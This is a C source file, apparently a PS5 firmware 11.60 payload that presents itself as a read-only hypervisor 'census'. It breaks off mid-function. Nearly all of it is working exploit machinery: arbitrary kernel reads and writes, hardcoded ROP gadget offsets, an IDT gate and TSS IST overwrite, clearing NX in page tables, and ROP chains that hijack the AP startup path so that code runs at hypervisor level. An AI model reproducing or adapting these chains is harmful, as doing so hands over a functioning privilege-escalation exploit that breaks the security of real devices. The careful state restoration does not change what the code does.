/*
 * Opt-in, read-only 11.60 VMCB census.
 *
 * This payload deliberately does not stage Linux, alter FACS, install the
 * #GP/#SX wake chain, or link the production break_hv object.  Its startup-AP
 * blob reads only page-table-validated HV frames and restores every carrier
 * mutation before returning to the original startup callback.
 */
#include "../shellcode_break_hv_census/census.h"
#include "../shellcode_break_hv_census/census_params.h"

#include <errno.h>
#include <fcntl.h>
#include <ps5/kernel.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/cpuset.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <unistd.h>

int sceKernelGetCurrentCpu(void);
int sceKernelGetMainSocId(void);
int sceKernelGetHwModelName(char *);
int sceKernelSendNotificationRequest(int, void *, size_t, int);
int sceKernelOpenEventFlag(void *, const char *);
int sceKernelNotifySystemSuspendStart(void);
int sceKernelSetEventFlag(void *, int);
int sceKernelCloseEventFlag(void *);
extern const intptr_t KERNEL_ADDRESS_DMAP_BASE;

#define FW_1160_RAW 0x11600005U
#define PS5_PRO_SOC_ID 0x840fd0
#ifndef CENSUS_VARIANT_PRO
#error "build with CENSUS_VARIANT_PRO=0 or 1"
#endif
#if CENSUS_VARIANT_PRO
#define CENSUS_VARIANT "pro"
#define REPORT_BASE "ps5-1160-pro-census"
#else
#define CENSUS_VARIANT "regular-control"
#define REPORT_BASE "ps5-1160-regular-census"
#endif
#define NCPU 16
#define FRAME 0x1000ULL
#define PAGE_PA(v) ((v) & 0x000ffffffffff000ULL)
#define PTE_P (1ULL << 0)
#define PTE_RW (1ULL << 1)
#define PTE_PWT (1ULL << 3)
#define PTE_PCD (1ULL << 4)
#define PTE_PS (1ULL << 7)
#define PTE_PAT4K (1ULL << 7)
#define PTE_PATBIG (1ULL << 12)
#define PTE_XO (1ULL << 58)
#define PTE_NX (1ULL << 63)

#define OFF_BUILD_STRING 0x10a1e94ULL
#define OFF_IMAGE_SIZE_RECORD 0x3e10038ULL
#define OFF_BOOT_METADATA 0x3e10000ULL
#define IMAGE_SIZE_RECORD 0x800000004ULL
#define IMAGE_SIZE_1160 0x3e0e040ULL
#define BUILD_STRING                                                            \
  "W:/Build/J03675007/sys/freebsd/sys/fs/devpfs/devpfs_shadowtbl.c"

#define HV_BASE_PRO 0x8e0000000ULL
#define HV_SIZE_PRO 0x2000000ULL
#define HV_SCAN_LO_PRO 0xa00000ULL
#define HV_SCAN_HI_PRO 0x1800000ULL
#define HV_BASE_REGULAR 0x62800000ULL
#define HV_SIZE_REGULAR 0x2029000ULL
#define HV_SCAN_LO_REGULAR 0x200000ULL
#define HV_SCAN_HI_REGULAR 0x1000000ULL
#define HV_CODE_LO_PRO 0x800000ULL
#define HV_CODE_LO_REGULAR 0ULL

#define OFF_IDT 0x3ba0300ULL
#define OFF_COMMON_TSS 0x3ba2fe0ULL
#define OFF_HV_MP_STARTUP_CALL 0xc885d0ULL
#define OFF_MP_STARTUP_INIT_VECTOR 0x3110b8ULL
#define OFF_DATA_CAVE 0x2d02000ULL
#define OFF_GAD_PIVOT_ADD_RSP28_RET 0x2a0edeULL
#define OFF_GAD_IRETQ 0x2ac22dULL
#define OFF_GAD_POP_RAX_RET 0x338d2aULL
#define OFF_GAD_POP_RCX_RET 0x339712ULL
#define OFF_GAD_POP_RDI_RET 0x289e0aULL
#define OFF_GAD_POP_RSI_RET 0x8aafb5ULL
#define OFF_GAD_POP_RDX_RET 0x3476dbULL
#define OFF_GAD_POP_RSP_RET 0x33974dULL
#define OFF_GAD_STORE_RDI8_RCX_RET 0x3cc4afULL
#define OFF_GAD_SET_DR7_RET 0xa7bd86ULL
#define OFF_GAD_STORE_RCX_RAX_RET 0x3620bfULL
#define OFF_GAD_MOV_RAX_RDI_RET 0xc5e5daULL
#define OFF_GAD_REP_MOVSB_RET 0x304367ULL
#define OFF_GAD_CLD_RET 0x462c1aULL
#define OFF_GAD_RET_TRAMP 0x338d2bULL
#define OFF_GAD_DBREG_RESUME 0x2a5778ULL

#define TSS_STRIDE 0x68ULL
#define TSS_IST(ist) (0x24ULL + ((uint64_t)((ist)-1) * 8ULL))
#define KH_USER_CS 0x43ULL
#define KH_USER_SS 0x3bULL
#define KH_RFLAGS_USER 0x202ULL
#define KH_DR7_BP0_EXEC 0x403ULL
#define KH_GATE_INTERRUPT 0xeULL
#define RC_RBP 0x20ULL
#define RC_RSP 0x28ULL
#define RC_RIP 0x38ULL
#define RC_DR7 0xa0ULL

#define AP_PAYLOAD_PAGE 0x3ffff000ULL
#define AP_COPY_SIZE 0x800ULL
#define CAVE_ARM_OFF 0x1000ULL
#define CAVE_ARM_CTX_OFF 0x100ULL
#define CAVE_ARM_CONT_OFF 0x200ULL
#define CAVE_FALLBACKS_OFF 0x1400ULL
#define CAVE_HANDLER_OFF 0x2400ULL
#define CAVE_AP_SOURCE_OFF 0x2800ULL
#define CAVE_SAVE_OFF 0x3000ULL
#define CAVE_REPORT_OFF 0x3400ULL
#define CAVE_BITMAP_OFF 0x3800ULL
#define CAVE_BITMAP_CAP 0x800ULL
#define IRET_OFF 0x20ULL
#define STACK_TOP_OFF 0x50ULL
#define FALLBACK_SIZE 0x100ULL
#define SAVE_STATE 0x00ULL
#define SAVE_GATE_LO 0x08ULL
#define SAVE_GATE_HI 0x10ULL
#define SAVE_ISTS 0x18ULL
#define STATE_ARMED 0x5355534e45432d31ULL /* "1-CENSUS" */

#define USB_ROOT_FMT "/mnt/usb%d"

_Static_assert(CAVE_ARM_OFF + 0x400 <= CAVE_FALLBACKS_OFF,
               "arm overlaps fallbacks");
_Static_assert(CAVE_FALLBACKS_OFF + 15 * FALLBACK_SIZE <= CAVE_HANDLER_OFF,
               "fallbacks overlap handler");
_Static_assert(CAVE_HANDLER_OFF + 0x400 <= CAVE_AP_SOURCE_OFF,
               "handler overlaps AP source");
_Static_assert(CAVE_AP_SOURCE_OFF + AP_COPY_SIZE <= CAVE_SAVE_OFF,
               "AP source overlaps save state");
_Static_assert(CAVE_REPORT_OFF + sizeof(struct census_report) <=
                   CAVE_BITMAP_OFF,
               "report overlaps bitmap");
_Static_assert(CAVE_BITMAP_OFF + CAVE_BITMAP_CAP <= 0x4000,
               "bitmap exceeds data cave");
_Static_assert(sizeof(census_bin) <= AP_COPY_SIZE,
               "census AP payload exceeds copy area");

static uint64_t ktext, dmap, cr3;
static uint64_t old_affinity[2];
static int affinity_saved;
static char pending_name[96], final_name[96], temp_name[96];

struct ap_path_state {
  uint64_t address[4];
  uint64_t original[4];
  uint64_t executable[4];
  uint64_t nx_mask;
  uint64_t touched_mask;
  int levels;
};

static int kread(uint64_t address, void *out, size_t size) {
  memset(out, 0, size);
  return kernel_copyout((intptr_t)address, out, size);
}

static int kread64(uint64_t address, uint64_t *value) {
  return kread(address, value, sizeof(*value));
}

static int kwrite(uint64_t address, const void *data, size_t size) {
  return kernel_copyin(data, (intptr_t)address, size);
}

static int kwrite64(uint64_t address, uint64_t value) {
  return kwrite(address, &value, sizeof(value));
}

static uint64_t kg(uint64_t offset) { return ktext + offset; }

static void notify(const char *fmt, ...) {
  struct {
    char pad[45];
    char msg[3075];
  } request;
  va_list ap;

  memset(&request, 0, sizeof(request));
  va_start(ap, fmt);
  vsnprintf(request.msg, sizeof(request.msg), fmt, ap);
  va_end(ap);
  sceKernelSendNotificationRequest(0, &request, sizeof(request), 0);
  printf("%s\n", request.msg);
}

static int write_all(int fd, const void *data, size_t size) {
  const uint8_t *p = data;
  while (size) {
    ssize_t n = write(fd, p, size);
    if (n <= 0)
      return -1;
    p += n;
    size -= (size_t)n;
  }
  return 0;
}

static int is_mount_point(const char *path) {
  struct statfs here, parent;
  char up[128];
  char *slash;

  snprintf(up, sizeof(up), "%s", path);
  slash = strrchr(up, '/');
  if (!slash || slash == up)
    return 0;
  *slash = 0;
  return statfs(path, &here) == 0 && statfs(up, &parent) == 0 &&
         strcmp(here.f_mntonname, parent.f_mntonname) != 0;
}

/* 0 means absent, 1 means occupied, and -1 means the filesystem could not be
 * checked safely. */
static int path_state(const char *path) {
  struct stat st;
  if (stat(path, &st) == 0)
    return 1;
  return errno == ENOENT ? 0 : -1;
}

static int fsync_dir(const char *path) {
  const int fd = open(path, O_RDONLY);
  if (fd < 0)
    return -1;
  const int rc = fsync(fd);
  const int close_rc = close(fd);
  return rc || close_rc ? -1 : 0;
}

static int remove_pending(const char *root, const char *path) {
  return unlink(path) || fsync_dir(root) ? -1 : 0;
}

static int reserve_pending(char *root, size_t root_size, int *fd_out) {
  char pending[256], final[256], temp[256];

  for (int usb = 0; usb < 8; usb++) {
    snprintf(root, root_size, USB_ROOT_FMT, usb);
    if (!is_mount_point(root))
      continue;
    for (int n = 1; n < 100; n++) {
      const char *suffix = "";
      char numbered[8];
      if (n != 1) {
        snprintf(numbered, sizeof(numbered), "-%02d", n);
        suffix = numbered;
      }
      snprintf(pending_name, sizeof(pending_name), "%s-pending%s.txt",
               REPORT_BASE, suffix);
      snprintf(final_name, sizeof(final_name), "%s%s.txt", REPORT_BASE,
               suffix);
      snprintf(temp_name, sizeof(temp_name), "%s%s.txt.tmp", REPORT_BASE,
               suffix);
      snprintf(pending, sizeof(pending), "%s/%s", root, pending_name);
      snprintf(final, sizeof(final), "%s/%s", root, final_name);
      snprintf(temp, sizeof(temp), "%s/%s", root, temp_name);
      const int pending_state = path_state(pending);
      int final_state = path_state(final), temp_state = path_state(temp);
      if (pending_state < 0 || final_state < 0 || temp_state < 0)
        break;
      if (pending_state || final_state || temp_state)
        continue;
      int fd = open(pending, O_WRONLY | O_CREAT | O_EXCL, 0600);
      if (fd >= 0) {
        final_state = path_state(final);
        temp_state = path_state(temp);
        if (final_state || temp_state) {
          close(fd);
          unlink(pending);
          if (final_state < 0 || temp_state < 0)
            break;
          continue;
        }
        *fd_out = fd;
        return 0;
      }
      if (errno != EEXIST)
        break;
    }
  }
  return -1;
}

static int init_kernel_layout(void) {
  struct {
    uint64_t lock[4];
    uint64_t pml4;
    uint64_t pcr3;
  } pmap;
  const uint64_t proc = kernel_get_proc(0);
  uint64_t vmspace, pmap_va;

  ktext = KERNEL_ADDRESS_TEXT_BASE;
  if (!proc || kread64(proc + KERNEL_OFFSET_PROC_P_VMSPACE, &vmspace) ||
      !vmspace || kread64(vmspace + 0x1d8, &pmap_va) || !pmap_va)
    return -1;
  memset(&pmap, 0, sizeof(pmap));
  if (kread(pmap_va, &pmap, sizeof(pmap)))
    return -1;
  if (!pmap.pml4 || !pmap.pcr3 || pmap.pml4 < pmap.pcr3)
    return -1;
  cr3 = pmap.pcr3;
  dmap = pmap.pml4 - pmap.pcr3;
  return dmap == (uint64_t)KERNEL_ADDRESS_DMAP_BASE ? 0 : -1;
}

static int validate_build(void) {
  char build[sizeof(BUILD_STRING)];
  uint64_t record[2];

  if (kread(kg(OFF_BUILD_STRING), build, sizeof(build)) ||
      kread(kg(OFF_IMAGE_SIZE_RECORD), record, sizeof(record)))
    return -1;
  return memcmp(build, BUILD_STRING, sizeof(build)) == 0 &&
                 record[0] == IMAGE_SIZE_RECORD && record[1] == IMAGE_SIZE_1160
             ? 0
             : -1;
}

static int parse_hv_region(uint64_t expected_base, uint64_t expected_size,
                           uint64_t *base_out, uint64_t *size_out) {
  uint64_t record = kg(OFF_BOOT_METADATA);
  const uint64_t metadata_end = kg(OFF_BOOT_METADATA) + 0x1000;
  int candidates = 0;
  int saw_end = 0;

  for (int recno = 0; recno < 64; recno++) {
    uint32_t header[2];
    if (record > metadata_end - sizeof(header))
      return -1;
    if (kread(record, header, sizeof(header)))
      return -1;
    const uint32_t type = header[0], data_size = header[1];
    if (!type && !data_size) {
      saw_end = 1;
      break;
    }
    if (data_size > 0x10000)
      return -1;
    const uint64_t advance = 8 + (((uint64_t)data_size + 7) & ~7ULL);
    if (record > UINT64_MAX - advance || record + advance > metadata_end)
      return -1;
    if (recno == 0) {
      char name[7];
      if (type != 1 || data_size != sizeof(name))
        return -1;
      if (kread(record + 8, name, sizeof(name)))
        return -1;
      if (memcmp(name, "kernel", sizeof(name)))
        return -1;
    }
    if (type == 0x9004) {
      uint64_t map_size, desc_size;
      uint32_t version;
      if (data_size < 0x20)
        return -1;
      if (kread(record + 8, &map_size, sizeof(map_size)) ||
          kread(record + 0x10, &desc_size, sizeof(desc_size)) ||
          kread(record + 0x18, &version, sizeof(version)))
        return -1;
      if (version != 1 || desc_size < 0x28 || desc_size > 0x80 ||
          !map_size || map_size > data_size - 0x20 || map_size % desc_size)
        return -1;
      const uint64_t count = map_size / desc_size;
      if (count > 128)
        return -1;
      for (uint64_t i = 0; i < count; i++) {
        const uint64_t desc = record + 0x28 + i * desc_size;
        uint32_t memory_type;
        uint64_t base, pages;
        if (kread(desc, &memory_type, sizeof(memory_type)) ||
            kread(desc + 8, &base, sizeof(base)) ||
            kread(desc + 0x18, &pages, sizeof(pages)))
          return -1;
        if (memory_type == 0 && pages <= (UINT64_MAX >> 12) && base &&
            base < 0x1000000000ULL) {
          const uint64_t size = pages << 12;
          if (size > 0x17fffffULL && size < 0x4000001ULL) {
            candidates++;
            *base_out = base;
            *size_out = size;
          }
        }
      }
    }
    record += advance;
  }
  return saw_end && candidates == 1 && *base_out == expected_base &&
                 *size_out == expected_size
             ? 0
             : -1;
}

static int walk_identity(uint64_t pa, int require_executable) {
  uint64_t table = cr3;
  const uint64_t va = dmap + pa;

  for (int level = 0; level < 4; level++) {
    const int shift = 39 - level * 9;
    const uint64_t index = (va >> shift) & 0x1ff;
    uint64_t entry;
    if (kread64(dmap + PAGE_PA(table) + index * 8, &entry))
      return -1;
    if (!(entry & PTE_P))
      return -1;
    /* Execute-only anywhere in the chain can fault when the AP reads it. */
    if (entry & PTE_XO)
      return -1;
    /* The AP destination is written and then executed through this complete
     * translation chain.  Effective RW/X permission is the intersection of
     * every paging level, not just the terminal entry. */
    if (require_executable &&
        ((entry & PTE_NX) || !(entry & PTE_RW)))
      return -1;
    if (!require_executable && (entry & (PTE_PWT | PTE_PCD)))
      return -1;
    if (((level == 1 || level == 2) && (entry & PTE_PS)) || level == 3) {
      const uint64_t page_size = level == 1 ? 1ULL << 30
                                 : level == 2 ? 1ULL << 21
                                              : FRAME;
      const uint64_t pat = level == 3 ? PTE_PAT4K : PTE_PATBIG;
      const uint64_t resolved =
          (PAGE_PA(entry) & ~(page_size - 1)) | (va & (page_size - 1));
      if (resolved != pa || (!require_executable && (entry & pat)))
        return -1;
      return 0;
    }
    table = PAGE_PA(entry);
  }
  return -1;
}

/* The production 11.60 carrier clears NX on the AP page's translation path.
 * The census records the exact entries first, changes only NX after the
 * pending USB report is durable, and restores the original entries with
 * readback after the AP returns. */
static int inspect_ap_path(uint64_t pa, struct ap_path_state *path) {
  uint64_t table = cr3;
  const uint64_t va = dmap + pa;

  memset(path, 0, sizeof(*path));
  for (int level = 0; level < 4; level++) {
    const int shift = 39 - level * 9;
    const uint64_t index = (va >> shift) & 0x1ff;
    const uint64_t address = dmap + PAGE_PA(table) + index * 8;
    uint64_t entry;

    if (kread64(address, &entry))
      return -1;
    path->address[level] = address;
    path->original[level] = entry;
    path->executable[level] = entry & ~PTE_NX;
    path->levels = level + 1;
    if (!(entry & PTE_P) || (entry & PTE_XO) || !(entry & PTE_RW))
      return -1;
    if (entry & PTE_NX)
      path->nx_mask |= 1ULL << level;
    if (((level == 1 || level == 2) && (entry & PTE_PS)) || level == 3) {
      const uint64_t page_size = level == 1 ? 1ULL << 30
                                 : level == 2 ? 1ULL << 21
                                              : FRAME;
      const uint64_t resolved =
          (PAGE_PA(entry) & ~(page_size - 1)) | (va & (page_size - 1));
      return resolved == pa ? 0 : -1;
    }
    table = PAGE_PA(entry);
  }
  return -1;
}

static int restore_ap_path(struct ap_path_state *path) {
  int rc = 0;

  /* Restore the upper entries first so the path stops being executable as
   * early as possible. Never overwrite a value that is neither the saved
   * original nor the value written by this payload. */
  for (int level = 0; level < path->levels; level++) {
    if (!(path->touched_mask & (1ULL << level)))
      continue;
    uint64_t live = 0;
    if (kread64(path->address[level], &live)) {
      rc = -1;
      continue;
    }
    if (live != path->original[level]) {
      if (live != path->executable[level] ||
          kwrite64(path->address[level], path->original[level])) {
        rc = -1;
        continue;
      }
    }
    if (kread64(path->address[level], &live) ||
        live != path->original[level]) {
      rc = -1;
      continue;
    }
    path->touched_mask &= ~(1ULL << level);
  }
  /* Untouched entries are part of the validated translation too. Prove that
   * the complete path, not only entries carrying NX, still matches the
   * snapshot taken before arming. */
  for (int level = 0; level < path->levels; level++) {
    uint64_t live = 0;
    if (kread64(path->address[level], &live) ||
        live != path->original[level])
      rc = -1;
  }
  return rc || path->touched_mask ? -1 : 0;
}

static int make_ap_path_executable(struct ap_path_state *path) {
  /* Revalidate the complete path immediately before the first write. */
  for (int level = 0; level < path->levels; level++) {
    uint64_t live = 0;
    if (kread64(path->address[level], &live) ||
        live != path->original[level])
      goto fail;
  }
  for (int level = 0; level < path->levels; level++) {
    if (!(path->nx_mask & (1ULL << level)))
      continue;
    uint64_t live = 0;
    if (kread64(path->address[level], &live) ||
        live != path->original[level])
      goto fail;
    /* Mark the entry as owned before the write so a write error still causes
     * an exact restoration attempt. */
    path->touched_mask |= 1ULL << level;
    if (kwrite64(path->address[level], path->executable[level]) ||
        kread64(path->address[level], &live) ||
        live != path->executable[level])
      goto fail;
  }
  /* Confirm every level still resolves through the exact entries admitted by
   * the preflight, with only NX removed. */
  for (int level = 0; level < path->levels; level++) {
    uint64_t live = 0;
    if (kread64(path->address[level], &live) ||
        live != path->executable[level])
      goto fail;
  }
  return 0;

fail:
  return restore_ap_path(path) ? -2 : -1;
}

static int build_mapping_bitmap(uint64_t base, uint64_t size,
                                uint64_t scan_lo, uint64_t scan_hi,
                                uint8_t *bitmap, size_t cap,
                                uint64_t *mapped_out) {
  const uint64_t pages = size / FRAME;
  if ((pages + 7) / 8 > cap)
    return -1;
  memset(bitmap, 0, cap);
  *mapped_out = 0;
  for (uint64_t page = 0; page < pages; page++) {
    if (walk_identity(base + page * FRAME, 0) == 0) {
      bitmap[page >> 3] |= 1U << (page & 7);
      (*mapped_out)++;
    }
  }
  for (uint64_t off = scan_lo; off < scan_hi; off += FRAME)
    if (!(bitmap[(off / FRAME) >> 3] & (1U << ((off / FRAME) & 7))))
      return -1;
  return 0;
}

static int bitmap_range_present(const uint8_t *bitmap, size_t bytes,
                                uint64_t region_size, uint64_t offset,
                                uint64_t length) {
  if (!length || offset > region_size || length > region_size - offset)
    return 0;
  const uint64_t first = offset / FRAME;
  const uint64_t last = (offset + length - 1) / FRAME;
  for (uint64_t page = first; page <= last; page++) {
    if ((page >> 3) >= bytes ||
        !(bitmap[page >> 3] & (1U << (page & 7))))
      return 0;
  }
  return 1;
}

static uint64_t tss_ist_slot(uint64_t tss_base, int cpu, int ist) {
  return tss_base + (uint64_t)cpu * TSS_STRIDE + TSS_IST(ist);
}

static int canonical_kernel(uint64_t value) {
  return value && (value >> 47) == 0x1ffffULL;
}

static int verify_tss_layout(uint64_t saved[NCPU]) {
  const uint64_t tss_base = kg(OFF_COMMON_TSS);
  uint64_t gate_lo;
  uint64_t ist4[NCPU];

  if (kread64(kg(OFF_IDT) + 16, &gate_lo))
    return -1;
  if (!((gate_lo >> 47) & 1) || ((gate_lo >> 32) & 7) != 4)
    return -1;
  for (int cpu = 0; cpu < NCPU; cpu++) {
    const uint64_t base = tss_base + (uint64_t)cpu * TSS_STRIDE;
    uint64_t rsp0;
    if (kread64(base + 0x04, &rsp0) ||
        kread64(base + TSS_IST(4), &ist4[cpu]) ||
        kread64(tss_ist_slot(tss_base, cpu, 6), &saved[cpu]))
      return -1;
    if (!canonical_kernel(rsp0) || !canonical_kernel(ist4[cpu]) || saved[cpu])
      return -1;
    for (int prior = 0; prior < cpu; prior++)
      if (ist4[cpu] == ist4[prior])
        return -1;
  }
  return 0;
}

static int restore_ists(const uint64_t saved[NCPU]) {
  const uint64_t tss_base = kg(OFF_COMMON_TSS);
  int rc = 0;
  for (int cpu = 0; cpu < NCPU; cpu++)
    if (kwrite64(tss_ist_slot(tss_base, cpu, 6), saved[cpu]))
      rc = -1;
  for (int cpu = 0; cpu < NCPU; cpu++) {
    uint64_t value;
    if (kread64(tss_ist_slot(tss_base, cpu, 6), &value) ||
        value != saved[cpu])
      rc = -1;
  }
  return rc;
}

static int verify_ists(const uint64_t saved[NCPU]) {
  const uint64_t tss_base = kg(OFF_COMMON_TSS);
  for (int cpu = 0; cpu < NCPU; cpu++) {
    uint64_t value;
    if (kread64(tss_ist_slot(tss_base, cpu, 6), &value) ||
        value != saved[cpu])
      return -1;
  }
  return 0;
}

static int clear_data_cave(void) {
  uint8_t zero[0x400] = {0}, readback[sizeof(zero)];
  const uint64_t cave = kg(OFF_DATA_CAVE);

  for (size_t off = 0; off < 0x4000; off += sizeof(zero))
    if (kwrite(cave + off, zero, sizeof(zero)))
      return -1;
  for (size_t off = 0; off < 0x4000; off += sizeof(readback)) {
    if (kread(cave + off, readback, sizeof(readback)) ||
        memcmp(readback, zero, sizeof(readback)))
      return -1;
  }
  return 0;
}

/* Restore only carrier state that this payload owns.  The high qword of the
 * IDT gate is never written by this payload, so a mismatch there is an
 * unrecoverable condition rather than permission to overwrite the gate. */
static int rollback_carrier(const uint64_t saved_gate[2],
                            const uint64_t saved_ists[NCPU]) {
  const uint64_t db_gate = kg(OFF_IDT) + 16;
  const uint64_t state_address =
      kg(OFF_DATA_CAVE) + CAVE_SAVE_OFF + SAVE_STATE;
  uint64_t gate_lo = 0, gate_hi = 0, state = UINT64_MAX;
  const int gate_lo_read_rc = kread64(db_gate, &gate_lo);
  const int gate_hi_read_rc = kread64(db_gate + 8, &gate_hi);
  int gate_rc = gate_lo_read_rc || gate_hi_read_rc;

  if (!gate_rc && gate_hi != saved_gate[1])
    gate_rc = -1;
  if (!gate_rc && gate_lo != saved_gate[0]) {
    const int write_rc = kwrite64(db_gate, saved_gate[0]);
    const int read_rc = kread64(db_gate, &gate_lo);
    if (write_rc || read_rc || gate_lo != saved_gate[0])
      gate_rc = -1;
  }

  const int ist_rc = restore_ists(saved_ists);
  const int state_write_rc = kwrite64(state_address, 0);
  const int state_read_rc = kread64(state_address, &state);
  const int state_rc = state_write_rc || state_read_rc || state;
  if (gate_rc || ist_rc || state_rc)
    return -1;
  return clear_data_cave();
}

static int pin_to_tss0(void) {
  uint64_t want[2] = {1ULL << 15, 0};
  if (cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
                         sizeof(old_affinity),
                         (cpuset_t *)old_affinity))
    return -1;
  affinity_saved = 1;
  if (cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, sizeof(want),
                         (const cpuset_t *)want))
    return -1;
  sched_yield();
  usleep(1000);
  return sceKernelGetCurrentCpu() == 15 ? 0 : -1;
}

static int restore_affinity(void) {
  uint64_t readback[2] = {0, 0};
  if (!affinity_saved)
    return 0;
  if (cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
                         sizeof(old_affinity),
                         (const cpuset_t *)old_affinity) ||
      cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
                         sizeof(readback), (cpuset_t *)readback))
    return -1;
  if (memcmp(readback, old_affinity, sizeof(readback)))
    return -1;
  affinity_saved = 0;
  return 0;
}

static void gate_encode(uint64_t target, uint16_t selector, uint8_t ist,
                        uint64_t *lo, uint64_t *hi) {
  *lo = (target & 0xffffULL) | ((uint64_t)selector << 16) |
        ((uint64_t)(ist & 7) << 32) | (KH_GATE_INTERRUPT << 40) |
        (1ULL << 47) | (((target >> 16) & 0xffffULL) << 48);
  *hi = (target >> 32) & 0xffffffffULL;
}

static int chain_q(uint8_t *buf, size_t *off, size_t cap, uint64_t value) {
  if (*off + sizeof(value) > cap)
    return -1;
  memcpy(buf + *off, &value, sizeof(value));
  *off += sizeof(value);
  return 0;
}

static int chain_store(uint8_t *buf, size_t *off, size_t cap, uint64_t target,
                       uint64_t value) {
  return chain_q(buf, off, cap, kg(OFF_GAD_POP_RDI_RET)) ||
         chain_q(buf, off, cap, target - 8) ||
         chain_q(buf, off, cap, kg(OFF_GAD_POP_RCX_RET)) ||
         chain_q(buf, off, cap, value) ||
         chain_q(buf, off, cap, kg(OFF_GAD_STORE_RDI8_RCX_RET));
}

static int build_passthrough(uint8_t *buf, uint64_t va) {
  const uint64_t trampoline = va + IRET_OFF;
  size_t off = STACK_TOP_OFF;
  memset(buf, 0, FALLBACK_SIZE);
  memcpy(buf + IRET_OFF, &(uint64_t){kg(OFF_GAD_IRETQ)}, 8);
  return chain_q(buf, &off, FALLBACK_SIZE, kg(OFF_GAD_POP_RSP_RET)) ||
         chain_q(buf, &off, FALLBACK_SIZE, trampoline);
}

static int build_arm(uint8_t *arm, uint64_t arm_va, uint64_t selected_ist,
                     uint64_t handler_top) {
  const uint64_t ctx = arm_va + CAVE_ARM_CTX_OFF;
  const uint64_t cont = arm_va + CAVE_ARM_CONT_OFF;
  size_t off = STACK_TOP_OFF;

  memset(arm, 0, 0x400);
  if (chain_q(arm, &off, 0x400, kg(OFF_GAD_POP_RAX_RET)) ||
      chain_q(arm, &off, 0x400, kg(OFF_HV_MP_STARTUP_CALL)) ||
      chain_q(arm, &off, 0x400, kg(OFF_GAD_POP_RDI_RET)) ||
      chain_q(arm, &off, 0x400, ctx) ||
      chain_q(arm, &off, 0x400, kg(OFF_GAD_DBREG_RESUME)) ||
      off > CAVE_ARM_CTX_OFF)
    return -1;

  memcpy(arm + CAVE_ARM_CTX_OFF + RC_RSP, &(uint64_t){cont - 8}, 8);
  memcpy(arm + CAVE_ARM_CTX_OFF + RC_RIP,
         &(uint64_t){kg(OFF_GAD_RET_TRAMP)}, 8);
  memcpy(arm + CAVE_ARM_CTX_OFF + RC_DR7, &(uint64_t){KH_DR7_BP0_EXEC}, 8);

  off = CAVE_ARM_CONT_OFF;
  if (chain_q(arm, &off, 0x400, kg(OFF_GAD_POP_RDI_RET)) ||
      chain_q(arm, &off, 0x400, selected_ist - 8) ||
      chain_q(arm, &off, 0x400, kg(OFF_GAD_POP_RCX_RET)) ||
      chain_q(arm, &off, 0x400, handler_top) ||
      chain_q(arm, &off, 0x400, kg(OFF_GAD_STORE_RDI8_RCX_RET)) ||
      chain_q(arm, &off, 0x400, kg(OFF_GAD_IRETQ)))
    return -1;
  off += 5 * sizeof(uint64_t);
  return off <= 0x400 ? 0 : -1;
}

static int build_handler(uint8_t *handler, uint64_t handler_va,
                         uint64_t data_cave, uint64_t saved_gate_lo,
                         uint64_t hv_base, uint64_t hv_size,
                         uint64_t scan_lo, uint64_t scan_hi,
                         uint64_t code_base) {
  const uint64_t trampoline = handler_va + IRET_OFF;
  const uint64_t payload_va = dmap + AP_PAYLOAD_PAGE;
  const uint64_t db_gate = kg(OFF_IDT) + 16;
  size_t save_addr_off, restore_rdi_off;
  size_t off = STACK_TOP_OFF;

  memset(handler, 0, 0x400);
  memcpy(handler + IRET_OFF, &(uint64_t){kg(OFF_GAD_IRETQ)}, 8);
  if (chain_q(handler, &off, 0x400, kg(OFF_GAD_MOV_RAX_RDI_RET)) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_POP_RCX_RET)))
    return -1;
  save_addr_off = off;
  if (chain_q(handler, &off, 0x400, 0) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_STORE_RCX_RAX_RET)) ||
      chain_store(handler, &off, 0x400, db_gate, saved_gate_lo) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_POP_RAX_RET)) ||
      chain_q(handler, &off, 0x400, 0) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_SET_DR7_RET)) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_CLD_RET)) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_POP_RDI_RET)) ||
      chain_q(handler, &off, 0x400, payload_va) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_POP_RSI_RET)) ||
      chain_q(handler, &off, 0x400, data_cave + CAVE_AP_SOURCE_OFF) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_POP_RCX_RET)) ||
      chain_q(handler, &off, 0x400, AP_COPY_SIZE) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_REP_MOVSB_RET)))
    return -1;

#define STORE_PARAM(index, value)                                              \
  do {                                                                          \
    if (chain_store(handler, &off, 0x400,                                      \
                    payload_va + 0xf00 + (uint64_t)(index) * 8, (value)))       \
      return -1;                                                                \
  } while (0)
  STORE_PARAM(CENSUS_P_INIT_CB, kg(OFF_MP_STARTUP_INIT_VECTOR));
  STORE_PARAM(CENSUS_P_DMAP, dmap);
  STORE_PARAM(CENSUS_P_REPORT, data_cave + CAVE_REPORT_OFF);
  STORE_PARAM(CENSUS_P_HV_BASE, hv_base);
  STORE_PARAM(CENSUS_P_HV_SIZE, hv_size);
  STORE_PARAM(CENSUS_P_NEEDLE_RIP, payload_va);
  STORE_PARAM(CENSUS_P_NEEDLE_CR3, cr3);
  STORE_PARAM(CENSUS_P_BITMAP, data_cave + CAVE_BITMAP_OFF);
  STORE_PARAM(CENSUS_P_BITMAP_BYTES, CAVE_BITMAP_CAP);
  STORE_PARAM(CENSUS_P_TSS_BASE, kg(OFF_COMMON_TSS));
  STORE_PARAM(CENSUS_P_SAVED_ISTS, data_cave + CAVE_SAVE_OFF + SAVE_ISTS);
  STORE_PARAM(CENSUS_P_CARRIER_STATE, data_cave + CAVE_SAVE_OFF + SAVE_STATE);
  STORE_PARAM(CENSUS_P_SCAN_LO, scan_lo);
  STORE_PARAM(CENSUS_P_SCAN_HI, scan_hi);
